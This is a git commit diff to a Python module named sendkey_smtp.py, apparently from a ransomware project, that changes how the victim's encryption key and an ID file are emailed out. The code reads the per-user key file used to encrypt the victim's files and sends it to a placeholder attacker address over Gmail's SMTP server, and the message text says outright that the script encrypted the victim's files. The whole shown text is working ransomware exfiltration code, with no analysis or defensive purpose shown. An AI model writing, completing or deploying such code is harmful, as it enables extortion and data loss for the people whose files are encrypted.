0da1961f7c1d8532809bfdebfc9fc8093b9abd6e
T-wcs <70718793+T-wcs@users.noreply.github.com>
2020-12-15 21:59:23 +0100

    Update sendkey_smtp.py

--- modules/network/sendkey_smtp.py
+++ modules/network/sendkey_smtp.py
@@ -13,22 +13,25 @@ current_user = os.environ["USERNAME"]
 fromaddr = "FROM_TO@gmail.com"
 toaddr = "DEST_TO@gmail.com"
 
+# PREPARE MULTIPLE ATTACHMENT
+attachment = ["id", "{}.key".format(current_user)]
+
 # FUNCTION TO PREPARE THE MAIL
 def send_key():
     try:
         msg = MIMEMultipart()
         msg['From'] = fromaddr
         msg['To'] = toaddr
-        msg['Subject'] = "The server you sending a key from the client"
-        body = "This key will be used to decrypt the files on the client infected"
+        msg['Subject'] = "Client Key and ID"
+        body = "The server you sending a key from the client, the script encrypted her files with this key."
         msg.attach(MIMEText(body, 'plain'))
-        filename = "{}.key".format(current_user)
-        attachment = open(filename, "rb")
-        p = MIMEBase('application', 'octet-stream')
-        p.set_payload((attachment).read())
-        encoders.encode_base64(p)
-        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
-        msg.attach(p)
+        # FOR MULTIPLE ATTACHMENT
+        for filename in attachment:
+            p = MIMEBase('application', 'octet-stream')
+            p.set_payload(open(filename, "rb").read())
+            encoders.encode_base64(p)
+            p.add_header('Content-Disposition', "attachment; filename= {}".format(filename))
+            msg.attach(p)
         s = smtplib.SMTP('smtp.gmail.com', 587)
         s.starttls()
         s.login(fromaddr, "YOUR_PASS_HERE")
